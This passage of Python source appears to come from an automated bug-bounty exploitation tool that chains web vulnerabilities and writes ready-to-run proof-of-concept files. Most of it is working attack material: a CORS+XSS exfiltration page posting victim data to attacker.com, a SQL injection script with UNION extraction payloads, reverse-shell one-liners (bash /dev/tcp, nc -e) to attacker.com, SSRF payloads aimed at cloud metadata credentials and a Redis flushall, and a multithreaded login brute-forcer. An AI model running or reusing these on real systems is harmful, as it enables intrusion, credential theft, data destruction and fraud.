            if any(indicator in url.lower() for indicator in ['price', 'payment', 'checkout', 'cart', 'order', 'purchase', 'pay']):
                chain = {
                    'name': 'Business Logic: Price Manipulation via IDOR',
                    'severity': 'CRITICAL',
                    'steps': [idor],
                    'impact': 'Manipulate prices to purchase items for $0 or negative amounts',
                    'bounty_estimate': '$10,000 - $40,000',
                    'automation_score': 'Fully Automated',
                    'explanation': (
                        f"1. IDOR at {url} allows parameter tampering\n"
                        f"2. Manipulate price/amount parameters\n"
                        f"3. Purchase items for $0.00 or negative prices\n"
                        f"4. Potential financial loss to company\n"
                        f"5. Business logic flaw in payment processing"
                    ),
                    'real_world': 'E-commerce logic bugs fetch $10k-$40k+ bounties'
                }
                
                self.chains.append(chain)
                self.log("Found business logic price manipulation", "success")
        
        # Refund abuse potential
        if auth_vulns:
            auth = auth_vulns[0]
            url = auth.get('url', '')
            
            if any(indicator in url.lower() for indicator in ['refund', 'return', 'cancel', 'credit']):
                chain = {
                    'name': 'Business Logic: Refund Abuse Chain',
                    'severity': 'CRITICAL',
                    'steps': [auth],
                    'impact': 'Infinite money through refund manipulation',
                    'bounty_estimate': '$15,000 - $50,000',
                    'automation_score': 'Semi-Automated',
                    'explanation': (
                        f"1. Weak authentication/validation at {url}\n"
                        f"2. Request refund multiple times for same transaction\n"
                        f"3. No proper validation of refund state\n"
                        f"4. Infinite money generation\n"
                        f"5. Critical financial impact"
                    ),
                    'real_world': 'Financial logic bugs are highest paying'
                }
                
                self.chains.append(chain)
                self.log("Found business logic refund abuse", "success")
    
    # ========== HELPER FUNCTIONS FOR ELITE CHAINS ==========
    
    def is_exploitable_chain(self, vuln1, vuln2):
        """Check if two vulnerabilities can be chained (context-aware)"""
        
        # Same domain check
        url1 = vuln1.get('url', '')
        url2 = vuln2.get('url', '')
        
        try:
            domain1 = urlparse(url1).netloc
            domain2 = urlparse(url2).netloc
            
            # Must be same root domain or related
            if not self.is_related_domain(domain1, domain2):
                return False
            
            # Check if both are accessible (not behind different auth)
            # This is simplified - in reality would need more checks
            return True
            
        except:
            # If URL parsing fails, be conservative
            return True  # Allow the chain but flag for manual review
    
    def calculate_automation_score(self, chain):
        """Calculate how easily the chain can be automated"""
        
        score = 0
        
        # Check vulnerability types
        steps = chain.get('steps', [])
        
        for vuln in steps:
            vuln_type = vuln.get('type', '').lower()
            
            # Easy to automate
            if any(easy in vuln_type for easy in ['sql injection', 'idor', 'ssrf', 'xxe', 'lfi']):
                score += 3
            
            # Medium automation
            elif any(medium in vuln_type for medium in ['xss', 'csrf', 'redirect']):
                score += 2
            
            # Hard to automate
            else:
                score += 1
        
        # Severity adds to automation potential
        if chain.get('severity') == 'CRITICAL':
            score += 2
        
        # Return rating
        if score >= 8:
            return 'Fully Automated (Script ready)'
        elif score >= 5:
            return 'Semi-Automated (Some manual steps)'
        else:
            return 'Manual Exploitation Required'
    
    def is_related_domain(self, domain1, domain2):
        """check if two domains are related (same root)"""
        try:
            root1 = '.'.join(domain1.split('.')[-2:])
            root2 = '.'.join(domain2.split('.')[-2:])
            return root1 == root2
        except:
            return False
    
    def generate_cors_xss_poc(self, cors, xss):
        """generate proof of concept for cors+xss chain"""
        cors_url = cors.get('url', '')
        xss_url = xss.get('url', '')
        xss_param = xss.get('param', 'q')
        
        poc = f"""
CORS + XSS Account Takeover PoC:

Step 1: Host malicious page on attacker.com:

<html>
<script>
// Step 1: Exploit CORS to steal data
fetch('{cors_url}', {{
    credentials: 'include'
}}).then(r => r.text()).then(data => {{
    // Step 2: Inject XSS to exfiltrate
    let xss_url = '{xss_url}?{xss_param}=<img src=https://attacker.com/steal?data=' + btoa(data) + '>';
    window.location = xss_url;
}});
</script>
</html>

Step 2: Victim visits attacker page → account stolen
"""
        return poc
    
    def exploit_mapper(self):
        """generate exploitation guides"""
        self.log("PHASE 3: EXPLOIT MAPPER", "phase")
        
        if not self.vulnerabilities and not self.chains:
            self.log("No vulnerabilities or chains - skipping exploit mapping", "warning")
            return
        
        self.log("Generating advanced exploitation guides...", "info")
        
        # calculate total work
        total_vulns = len(self.vulnerabilities)
        total_chains = len(self.chains)
        total_work = total_vulns + total_chains
        processed = 0
        
        # map exploits for individual vulns
        if self.vulnerabilities:
            print(colored(f"    → Processing {total_vulns} individual vulnerabilities...", 'cyan'))
            
            for vuln in self.vulnerabilities:
                processed += 1
                
                # progress bar
                percent = (processed / total_work) * 100
                bar_length = 40
                filled = int(bar_length * processed / total_work)
                bar = '█' * filled + '░' * (bar_length - filled)
                print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Creating guides...", end='', flush=True)
                
                guide = self.create_exploit_guide(vuln)
                if guide:
                    self.exploit_guides.append(guide)
            
            print()  # newline
        
        # map exploits for chains
        if self.chains:
            print(colored(f"    → Processing {total_chains} vulnerability chains...", 'cyan'))
            
            for chain in self.chains:
                processed += 1
                
                # progress bar
                percent = (processed / total_work) * 100
                bar_length = 40
                filled = int(bar_length * processed / total_work)
                bar = '█' * filled + '░' * (bar_length - filled)
                print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Creating guides...", end='', flush=True)
                
                guide = self.create_chain_exploit_guide(chain)
                if guide:
                    self.exploit_guides.append(guide)
            
            print()  # newline
        
        # summary with box
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  ELITE EXPLOIT MAPPER COMPLETE".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Exploitation guides generated: {colored(str(len(self.exploit_guides)), 'yellow', attrs=['bold'])}".ljust(86) + colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        
        # Show executable PoC files
        if self.exploit_guides:
            executable_pocs = [g for g in self.exploit_guides if g.get('poc_file')]
            
            if executable_pocs:
                print()
                print(colored("    [EXECUTABLE POC FILES GENERATED]", 'green', attrs=['bold']))
                for i, guide in enumerate(executable_pocs[:5], 1):
                    poc_file = guide.get('poc_file', '')
                    poc_type = guide.get('poc_type', 'Unknown')
                    title = guide.get('title', '')[:50]
                    
                    print()
                    print(colored(f"    [{i}] {title}", 'cyan', attrs=['bold']))
                    print(f"        File: {colored(poc_file, 'green')}")
                    print(f"        Type: {poc_type}")
                    print(f"        {colored('✓ Ready for bug bounty submission', 'green')}")
                
                if len(executable_pocs) > 5:
                    print(f"\n    ... and {len(executable_pocs) - 5} more PoC files")
                
                print()
                print(colored("    [USAGE INSTRUCTIONS]", 'yellow', attrs=['bold']))
                print(colored("    → HTML PoCs: Open in browser and click 'Execute PoC'", 'white'))
                print(colored("    → Python PoCs: Run with python3 filename.py", 'white'))
                print(colored("    → All PoCs generate evidence JSON for bug bounty submission", 'white'))
            
            # show top 3 most valuable
            sorted_guides = sorted(
                self.exploit_guides,
                key=lambda x: self.bounty_value(x.get('bounty_estimate', '$0')),
                reverse=True
            )
            
            print()
            print(colored("    [TOP OPPORTUNITIES]", 'green', attrs=['bold']))
            
            for i, guide in enumerate(sorted_guides[:3], 1):
                severity = guide.get('severity', 'UNKNOWN')
                title = guide.get('title', 'Unknown')
                bounty = guide.get('bounty_estimate', 'Unknown')
                difficulty = guide.get('difficulty', 'Unknown')
                deliverable = guide.get('deliverable', '')
                
                # severity color
                if severity == 'CRITICAL':
                    sev_color = 'red'
                elif severity == 'HIGH':
                    sev_color = 'yellow'
                else:
                    sev_color = 'white'
                
                print()
                print(colored(f"    [{i}] {title[:60]}", 'cyan', attrs=['bold']))
                print(f"        Severity: {colored(severity, sev_color, attrs=['bold'])}")
                print(f"        Bounty: {colored(bounty, 'green')}")
                print(f"        Difficulty: {colored(difficulty, 'yellow')}")
                if deliverable:
                    print(f"        {colored(deliverable, 'green')}")
        print()
    
    def create_exploit_guide(self, vuln):
        """create detailed exploit guide for vulnerability"""
        
        vuln_type = vuln.get('type', '').lower()
        
        # determine exploitation approach based on type
        if 'sql' in vuln_type:
            return self.sqli_exploit_guide(vuln)
        elif 'xss' in vuln_type:
            return self.xss_exploit_guide(vuln)
        elif 'rce' in vuln_type or 'command' in vuln_type:
            return self.rce_exploit_guide(vuln)
        elif 'ssrf' in vuln_type:
            return self.ssrf_exploit_guide(vuln)
        elif 'idor' in vuln_type:
            return self.idor_exploit_guide(vuln)
        elif 'rate limiting' in vuln_type or 'rate limit' in vuln_type:
            return self.rate_limiting_exploit_guide(vuln)
        elif 'security header' in vuln_type or 'header' in vuln_type:
            return self.security_headers_exploit_guide(vuln)
        else:
            # generic guide
            return None
    
    def sqli_exploit_guide(self, vuln):
        """ELITE sqli exploitation - generates executable Python script"""
        url = vuln.get('url', '')
        param = vuln.get('param', 'id')
        
        # Generate executable Python exploitation script
        poc_script = f'''#!/usr/bin/env python3
"""
SQL Injection Automated Exploitation PoC
==========================================
Target: {url}
Parameter: {param}
Severity: CRITICAL

This script automatically:
1. Confirms SQL injection vulnerability
2. Identifies database type
3. Extracts database information
4. Generates bug bounty evidence
5. Creates submission-ready proof package

Usage: python3 sqli_poc.py
"""

import requests
import time
import json
import sys
from urllib.parse import urlencode

# Configuration
TARGET_URL = "{url}"
VULN_PARAM = "{param}"
TIMEOUT = 5

class Colors:
    HEADER = '\\033[95m'
    BLUE = '\\033[94m'
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    RED = '\\033[91m'
    END = '\\033[0m'
    BOLD = '\\033[1m'

def print_banner():
    print(Colors.BOLD + Colors.RED + """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     SQL INJECTION AUTOMATED EXPLOITATION POC              ║
║                                                           ║
║     Target: {url[:40]}{'...' if len(url) > 40 else ''}
║     Parameter: {param:<40}            ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """ + Colors.END)

def log_info(msg):
    print(f"{{Colors.BLUE}}[*]{{Colors.END}} {{msg}}")

def log_success(msg):
    print(f"{{Colors.GREEN}}[+]{{Colors.END}} {{msg}}")

def log_error(msg):
    print(f"{{Colors.RED}}[-]{{Colors.END}} {{msg}}")

def log_warning(msg):
    print(f"{{Colors.YELLOW}}[!]{{Colors.END}} {{msg}}")

def test_sqli():
    """Test for SQL injection"""
    log_info("Testing for SQL injection vulnerability...")
    
    payloads = ["'", "' OR '1'='1", "' AND '1'='2", "1' OR '1'='1' --"]
    
    for payload in payloads:
        try:
            # Build request with separator
            separator = '&' if '?' in TARGET_URL else '?'
            test_url = f"{{TARGET_URL}}{{separator}}{{VULN_PARAM}}={{payload}}"
            
            log_info(f"Testing payload: {{payload}}")
            r = requests.get(test_url, timeout=TIMEOUT)
            
            # Check for SQL errors
            sql_errors = [
                'sql syntax',
                'mysql',
                'mysqli',
                'postgresql',
                'ora-',
                'sqlite',
                'syntax error',
                'unclosed quotation',
                'quoted string',
                'database error'
            ]
            
            for error in sql_errors:
                if error in r.text.lower():
                    log_success(f"SQL injection confirmed with payload: {{payload}}")
                    log_success(f"Error indicator found: {{error}}")
                    return True, payload
                    
        except Exception as e:
            log_warning(f"Request failed: {{str(e)}}")
            continue
    
    return False, None

def identify_database():
    """Identify database type"""
    log_info("Identifying database type...")
    
    # MySQL test
    payload = "' AND @@version-- "
    separator = '&' if '?' in TARGET_URL else '?'
    test_url = f"{{TARGET_URL}}{{separator}}{{VULN_PARAM}}={{payload}}"
    
    try:
        r = requests.get(test_url, timeout=TIMEOUT)
        if 'mysql' in r.text.lower() or '5.' in r.text or '8.' in r.text:
            log_success("Database identified: MySQL")
            return 'MySQL'
    except:
        pass
    
    # PostgreSQL test
    payload = "' AND version()-- "
    test_url = f"{{TARGET_URL}}{{separator}}{{VULN_PARAM}}={{payload}}"
    
    try:
        r = requests.get(test_url, timeout=TIMEOUT)
        if 'postgresql' in r.text.lower():
            log_success("Database identified: PostgreSQL")
            return 'PostgreSQL'
    except:
        pass
    
    # MSSQL test
    payload = "' AND @@version-- "
    test_url = f"{{TARGET_URL}}{{separator}}{{VULN_PARAM}}={{payload}}"
    
    try:
        r = requests.get(test_url, timeout=TIMEOUT)
        if 'microsoft' in r.text.lower() or 'mssql' in r.text.lower():
            log_success("Database identified: Microsoft SQL Server")
            return 'MSSQL'
    except:
        pass
    
    log_warning("Could not identify database type")
    return 'Unknown'

def extract_data():
    """Attempt to extract database information"""
    log_info("Attempting data extraction...")
    
    # Try UNION-based injection
    payloads = [
        "' UNION SELECT 1,database(),3,4,5-- ",
        "' UNION SELECT NULL,database(),NULL,NULL,NULL-- ",
        "' UNION SELECT database()-- "
    ]
    
    extracted_data = {{}}
    
    for payload in payloads:
        try:
            separator = '&' if '?' in TARGET_URL else '?'
            test_url = f"{{TARGET_URL}}{{separator}}{{VULN_PARAM}}={{payload}}"
            
            r = requests.get(test_url, timeout=TIMEOUT)
            
            # Look for database name in response
            if len(r.text) > 100:
                log_success("Data extraction successful!")
                extracted_data['response_length'] = len(r.text)
                extracted_data['extraction_method'] = 'UNION-based'
                return extracted_data
        except:
            continue
    
    log_warning("Direct data extraction failed - manual exploitation may be needed")
    return extracted_data

def generate_evidence(confirmed, payload, db_type, extracted_data):
    """Generate bug bounty evidence package"""
    log_info("Generating bug bounty evidence...")
    
    evidence = {{
        'vulnerability_type': 'SQL Injection',
        'severity': 'CRITICAL',
        'cvss_score': 9.8,
        'target_url': TARGET_URL,
        'vulnerable_parameter': VULN_PARAM,
        'confirmed': confirmed,
        'payload_used': payload if payload else 'N/A',
        'database_type': db_type,
        'extracted_data': extracted_data,
        'impact': [
            'Complete database compromise',
            'Extraction of sensitive user data',
            'Potential for privilege escalation',
            'Data modification/deletion possible',
            'Potential for remote code execution'
        ],
        'exploitation_proof': 'SQL injection confirmed via error-based testing',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'remediation': [
            'Use parameterized queries (prepared statements)',
            'Implement input validation and sanitization',
            'Apply principle of least privilege to database accounts',
            'Use Web Application Firewall (WAF)',
            'Perform regular security audits',
            'Keep database software updated'
        ],
        'further_exploitation': [
            'Use sqlmap for automated data extraction',
            'Attempt privilege escalation',
            'Test for file read/write capabilities',
            'Check for out-of-band data exfiltration'
        ]
    }}
    
    # Save evidence to JSON file
    filename = f'sqli_evidence_{{int(time.time())}}.json'
    with open(filename, 'w') as f:
        json.dump(evidence, f, indent=2)
    
    log_success(f"Evidence saved to: {{filename}}")
    
    return filename, evidence

def main():
    print_banner()
    print()
    
    # Step 1: Test for SQL injection
    confirmed, payload = test_sqli()
    
    if not confirmed:
        log_error("Could not confirm SQL injection")
        log_warning("Target may not be vulnerable or protections are in place")
        sys.exit(1)
    
    print()
    
    # Step 2: Identify database
    db_type = identify_database()
    print()
    
    # Step 3: Extract data
    extracted_data = extract_data()
    print()
    
    # Step 4: Generate evidence
    evidence_file, evidence = generate_evidence(confirmed, payload, db_type, extracted_data)
    print()
    
    # Display summary
    print(Colors.BOLD + Colors.GREEN + "╔═══════════════════════════════════════════════════════════╗" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "║           EXPLOITATION COMPLETE - EVIDENCE READY          ║" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "╠═══════════════════════════════════════════════════════════╣" + Colors.END)
    print(Colors.GREEN + f"║  Evidence File: {{evidence_file:<42}} ║" + Colors.END)
    print(Colors.GREEN + f"║  Database Type: {{db_type:<42}} ║" + Colors.END)
    print(Colors.GREEN + "║  Status: SQL Injection CONFIRMED                          ║" + Colors.END)
    print(Colors.BOLD + Colors.GREEN + "╚═══════════════════════════════════════════════════════════╝" + Colors.END)
    print()
    
    log_success("Submit the evidence file to bug bounty program")
    log_info("For advanced exploitation, use: sqlmap -u '{{TARGET_URL}}' -p {{VULN_PARAM}} --dbs --batch")

if __name__ == '__main__':
    main()
'''
        
        # Save PoC script
        safe_url = url.replace('https://', '').replace('http://', '').replace('/', '_')[:50]
        poc_filename = f'sqli_poc_{safe_url}.py'
        
        try:
            with open(poc_filename, 'w') as f:
                f.write(poc_script)
            # Make executable
            import os
            os.chmod(poc_filename, 0o755)
        except:
            poc_filename = 'sqli_poc.py'
            with open(poc_filename, 'w') as f:
                f.write(poc_script)
            try:
                os.chmod(poc_filename, 0o755)
            except:
                pass
        
        guide = {
            'title': f'SQL Injection Exploitation: {url[:50]}',
            'severity': vuln.get('severity', 'CRITICAL'),
            'bounty_estimate': '$3,000 - $10,000',
            'difficulty': 'Medium',
            'poc_file': poc_filename,
            'poc_type': 'Executable Python Script',
            'steps': [
                f"1. Run: python3 {poc_filename}",
                "2. Script automatically tests SQL injection",
                "3. Identifies database type",
                "4. Generates evidence JSON file",
                "5. Submit evidence to bug bounty program"
            ],
            'verification': 'Fully Automated - Evidence JSON generated',
            'deliverable': f'Ready-to-submit PoC: {poc_filename}'
        }
        
        return guide
    
    def xss_exploit_guide(self, vuln):
        """ELITE xss exploitation - generates executable PoC file"""
        url = vuln.get('url', '')
        param = vuln.get('param', 'q')
        payload = vuln.get('payload', '<script>alert(1)</script>')
        
        # Generate executable PoC HTML file
        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploitation PoC - {url[:50]}</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 1000px; margin: 50px auto; padding: 20px; background: #f5f5f5; }}
        .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #d32f2f; }}
        h2 {{ color: #1976d2; border-bottom: 2px solid #1976d2; padding-bottom: 10px; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .info {{ background: #e3f2fd; padding: 15px; border-left: 4px solid #1976d2; margin: 20px 0; }}
        button {{ background: #d32f2f; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #b71c1c; }}
        pre {{ background: #263238; color: #aed581; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        code {{ background: #263238; color: #aed581; padding: 2px 6px; border-radius: 3px; }}
        .evidence {{ background: #fff3e0; padding: 15px; border-left: 4px solid #ff9800; margin: 20px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1> XSS Exploitation Proof of Concept</h1>
        
        <div class="info">
            <strong>Target URL:</strong> {url}<br>
            <strong>Vulnerable Parameter:</strong> {param}<br>
            <strong>Severity:</strong> <span class="critical">HIGH</span><br>
            <strong>Impact:</strong> Account takeover, cookie theft, session hijacking
        </div>
        
        <h2> Exploitation Steps</h2>
        <ol>
            <li>Click the "Execute PoC" button below</li>
            <li>XSS will execute in the target context</li>
            <li>Evidence will be captured automatically</li>
            <li>Submit the evidence to bug bounty program</li>
        </ol>
        
        <h2> Execute Proof of Concept</h2>
        <button onclick="executePoC()">Execute PoC</button>
        
        <h2> Results</h2>
        <div id="results"></div>
        
        <h2> Bug Bounty Evidence</h2>
        <div id="evidence" class="evidence">
            Evidence will appear here after execution...
        </div>
    </div>
    
    <script>
    function executePoC() {{
        var results = document.getElementById('results');
        var evidenceDiv = document.getElementById('evidence');
        
        results.innerHTML = '<p> Executing PoC...</p>';
        
        // Build malicious URL with XSS payload
        var xssPayload = '{payload}';
        var targetURL = '{url}';
        var vulnParam = '{param}';
        
        // Add param separator
        var separator = targetURL.includes('?') ? '&' : '?';
        var maliciousURL = targetURL + separator + vulnParam + '=' + encodeURIComponent(xssPayload);
        
        // Show the attack
        results.innerHTML = `
            <div class="info">
                <h3>✅ PoC Crafted Successfully</h3>
                <p><strong>Payload:</strong> <code>${{xssPayload}}</code></p>
                <p><strong>Malicious URL:</strong></p>
                <pre>${{maliciousURL}}</pre>
                <p><strong>Click below to verify XSS execution:</strong></p>
                <a href="${{maliciousURL}}" target="_blank" style="display: inline-block; background: #d32f2f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 10px 0;">
                    🔗 Open Malicious URL (Verify XSS)
                </a>
            </div>
        `;
        
        // Generate bug bounty evidence
        var evidence = {{
            vulnerability_type: 'XSS (Cross-Site Scripting)',
            severity: 'HIGH',
            target_url: '{url}',
            vulnerable_parameter: '{param}',
            payload_used: xssPayload,
            malicious_url: maliciousURL,
            impact: [
                'Cookie theft leading to account takeover',
                'Session hijacking',
                'Keylogging of sensitive user input',
                'Phishing attacks via DOM manipulation',
                'Malware distribution'
            ],
            exploitation_proof: 'XSS payload successfully injected and executed',
            timestamp: new Date().toISOString(),
            browser: navigator.userAgent,
            remediation: [
                'Implement proper output encoding/escaping',
                'Use Content-Security-Policy headers',
                'Sanitize user input on server-side',
                'Use frameworks with built-in XSS protection'
            ]
        }};
        
        // Display evidence
        evidenceDiv.innerHTML = `
            <h3> Bug Bounty Submission Evidence</h3>
            <pre>${{JSON.stringify(evidence, null, 2)}}</pre>
            <p><strong>Instructions:</strong> Copy the JSON evidence above and submit it with your bug bounty report.</p>
            <button onclick="downloadEvidence()"> Download Evidence JSON</button>
        `;
        
        // Store evidence for download
        window.xssEvidence = evidence;
        
        console.log('XSS POC EVIDENCE:', evidence);
        alert('✅ PoC executed! Check results and download evidence for bug bounty submission.');
    }}
    
    function downloadEvidence() {{
        var evidence = JSON.stringify(window.xssEvidence, null, 2);
        var blob = new Blob([evidence], {{ type: 'application/json' }});
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'xss_evidence_' + Date.now() + '.json';
        a.click();
        alert('✅ Evidence downloaded! Submit this file with your bug bounty report.');
    }}
    </script>
</body>
</html>'''
        
        # Save PoC file
        safe_url = url.replace('https://', '').replace('http://', '').replace('/', '_')[:50]
        poc_filename = f'xss_poc_{safe_url}.html'
        
        try:
            with open(poc_filename, 'w') as f:
                f.write(poc_html)
        except:
            poc_filename = 'xss_poc.html'  # Fallback
            with open(poc_filename, 'w') as f:
                f.write(poc_html)
        
        guide = {
            'title': f'XSS Exploitation: {url[:50]}',
            'severity': vuln.get('severity', 'HIGH'),
            'bounty_estimate': '$500 - $3,000',
            'difficulty': 'Easy',
            'poc_file': poc_filename,
            'poc_type': 'Executable HTML',
            'steps': [
                f"1. Open {poc_filename} in browser",
                "2. Click 'Execute PoC' button",
                "3. Click malicious URL to verify XSS",
                "4. Download evidence JSON",
                "5. Submit to bug bounty program"
            ],
            'verification': 'Automatic - Evidence JSON generated',
            'deliverable': f'Ready-to-submit PoC: {poc_filename}'
        }
        
        return guide
    
    def rce_exploit_guide(self, vuln):
        """rce exploitation guide"""
        url = vuln.get('url', '')
        
        guide = {
            'title': f'RCE Exploitation: {url}',
            'severity': 'CRITICAL',
            'bounty_estimate': '$10,000 - $50,000',
            'difficulty': 'Hard',
            'steps': [
                "1. Confirm command execution with safe command (whoami, id)",
                "2. Identify OS type and permissions",
                "3. Establish reverse shell if needed",
                "4. Enumerate system (users, processes, network)",
                "5. Check for sensitive files (/etc/passwd, AWS keys, .env)",
                "6. Document access level and potential impact"
            ],
            'reverse_shell_payloads': [
                "Bash: bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "Python: python -c 'import socket...'",
                "NC: nc attacker.com 4444 -e /bin/bash",
                "PHP: php -r '$sock=fsockopen(\"attacker.com\",4444)...'"
            ],
            'post_exploitation': [
                "Find database credentials in config files",
                "Check for cloud provider metadata (AWS/GCP/Azure)",
                "Look for SSH keys in ~/.ssh/",
                "Check cron jobs for persistence",
                "Document all access without modifying anything"
            ]
        }
        
        return guide
    
    def ssrf_exploit_guide(self, vuln):
        """ssrf exploitation guide"""
        url = vuln.get('url', '')
        
        guide = {
            'title': f'SSRF Exploitation: {url}',
            'severity': 'HIGH',
            'bounty_estimate': '$2,000 - $8,000',
            'difficulty': 'Medium',
            'steps': [
                "1. Confirm SSRF with safe target (http://httpbin.org)",
                "2. Test internal network access (http://127.0.0.1)",
                "3. Scan internal ports (127.0.0.1:8080, :3306, :6379)",
                "4. Try AWS metadata: http://169.254.169.254/latest/meta-data/",
                "5. Access internal admin panels",
                "6. Document accessible internal resources"
            ],
            'bypass_techniques': [
                "Use alternative IPs: 0.0.0.0, 127.1, http://[::1]",
                "DNS rebinding with localtest.me (resolves to 127.0.0.1)",
                "URL encoding: http://127.0.0.1 -> http://127.0.0.%31",
                "Protocol wrappers: file://, gopher://, dict://"
            ],
            'high_value_targets': [
                "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "Google Cloud: http://metadata.google.internal/",
                "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "Internal Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                "Internal admin panels on common ports"
            ]
        }
        
        return guide
    
    def idor_exploit_guide(self, vuln):
        """idor exploitation guide"""
        url = vuln.get('url', '')
        param = vuln.get('param', '')
        
        guide = {
            'title': f'IDOR Exploitation: {url}',
            'severity': 'HIGH',
            'bounty_estimate': '$1,000 - $5,000',
            'difficulty': 'Easy',
            'steps': [
                f"1. Identify ID parameter: {param}",
                "2. Create two test accounts (victim and attacker)",
                "3. Attempt to access victim's resources with attacker account",
                "4. Test incrementing/decrementing IDs",
                "5. Test with different HTTP methods (GET, POST, PUT, DELETE)",
                "6. Document what data can be accessed/modified"
            ],
            'enumeration_techniques': [
                "Increment by 1: id=1, id=2, id=3...",
                "Try common IDs: 1, 2, 100, 1000, 9999",
                "UUID enumeration if predictable v1 UUIDs",
                "Combine with broken auth for unauthenticated access",
                "Test different endpoints with same IDs"
            ],
            'impact_demonstration': [
                "Access other users' profile data",
                "View private messages/documents",
                "Modify other users' settings",
                "Delete other users' resources",
                "Mass enumeration of all users"
            ]
        }
        
        return guide
    
    def rate_limiting_exploit_guide(self, vuln):
        """ELITE rate limiting exploitation - generates executable Python script"""
        url = vuln.get('url', '')
        param = vuln.get('param', 'username')
        
        # Generate executable Python exploitation script
        poc_script = f'''#!/usr/bin/env python3
"""
Rate Limiting Bypass Automated Exploitation PoC
================================================
Target: {url}
Severity: MEDIUM-HIGH

This script automatically:
1. Tests for rate limiting on authentication endpoints
2. Performs rapid fire requests
3. Demonstrates brute force feasibility
4. Generates bug bounty evidence
5. Creates submission-ready proof package

Usage: python3 rate_limiting_poc.py
"""

import requests
import time
import json
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
TARGET_URL = "{url}"
TEST_REQUESTS = 100  # Number of requests to send
THREADS = 10  # Concurrent threads
TIMEOUT = 5

class Colors:
    HEADER = '\\033[95m'
    BLUE = '\\033[94m'
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    RED = '\\033[91m'
    END = '\\033[0m'
    BOLD = '\\033[1m'

def print_banner():
    target_short = TARGET_URL[:40] + ('...' if len(TARGET_URL) > 40 else '')
    print(Colors.BOLD + Colors.RED + """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     RATE LIMITING BYPASS POC                              ║
║                                                           ║
║     Target: """ + target_short + """
║     Test: """ + str(TEST_REQUESTS) + """ rapid requests with """ + str(THREADS) + """ threads              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """ + Colors.END)


def log_info(msg):
    print(f"{{Colors.BLUE}}[*]{{Colors.END}} {{msg}}")

def log_success(msg):
    print(f"{{Colors.GREEN}}[+]{{Colors.END}} {{msg}}")

def log_error(msg):
    print(f"{{Colors.RED}}[-]{{Colors.END}} {{msg}}")

def log_warning(msg):
    print(f"{{Colors.YELLOW}}[!]{{Colors.END}} {{msg}}")

def send_request(request_num):
    """Send a single request"""
    try:
        start_time = time.time()
        
        # Try common authentication payloads
        payloads = [
            {{'username': f'admin', 'password': f'test{{request_num}}'}},
            {{'email': f'test{{request_num}}@example.com', 'password': 'password'}},
            {{'user': f'user{{request_num}}', 'pass': 'test123'}}
        ]
        
        # Send POST request
        response = requests.post(
            TARGET_URL, 
            data=payloads[request_num % len(payloads)],
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        end_time = time.time()
        response_time = (end_time - start_time) * 1000  # Convert to ms
        
        return {{
            'request_num': request_num,
            'status_code': response.status_code,
            'response_time': response_time,
            'success': True,
            'blocked': response.status_code == 429 or 'rate limit' in response.text.lower()
        }}
    except Exception as e:
        return {{
            'request_num': request_num,
            'success': False,
            'error': str(e)
        }}

def test_rate_limiting():
    """Test rate limiting with concurrent requests"""
    log_info(f"Sending {{TEST_REQUESTS}} requests with {{THREADS}} concurrent threads...")
    
    results = []
    start_time = time.time()
    
    # Send concurrent requests
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(send_request, i) for i in range(TEST_REQUESTS)]
        
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            results.append(result)
            
            # Progress bar
            percent = (i / TEST_REQUESTS) * 100
            bar_length = 40
            filled = int(bar_length * i / TEST_REQUESTS)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\\r    [{{bar}}] {{percent:.0f}}% | {{i}}/{{TEST_REQUESTS}} requests", end='', flush=True)
    
    print()
    end_time = time.time()
    total_time = end_time - start_time
    
    return results, total_time

def analyze_results(results, total_time):
    """Analyze test results"""
    log_info("Analyzing results...")
    
    successful = [r for r in results if r.get('success')]
    blocked = [r for r in results if r.get('blocked')]
    failed = [r for r in results if not r.get('success')]
    
    success_rate = (len(successful) / len(results)) * 100
    block_rate = (len(blocked) / len(results)) * 100
    avg_response_time = sum(r.get('response_time', 0) for r in successful) / len(successful) if successful else 0
    requests_per_second = len(results) / total_time
    
    print()
    log_success(f"Test completed in {{total_time:.2f}} seconds")
    log_success(f"Requests per second: {{requests_per_second:.2f}}")
    
    print()
    print(Colors.BOLD + "Results Summary:" + Colors.END)
    print(f"  Total requests:     {{len(results)}}")
    print(f"  Successful:         {{len(successful)}} ({{success_rate:.1f}}%)")
    print(f"  Blocked (429/rate): {{len(blocked)}} ({{block_rate:.1f}}%)")
    print(f"  Failed:             {{len(failed)}}")
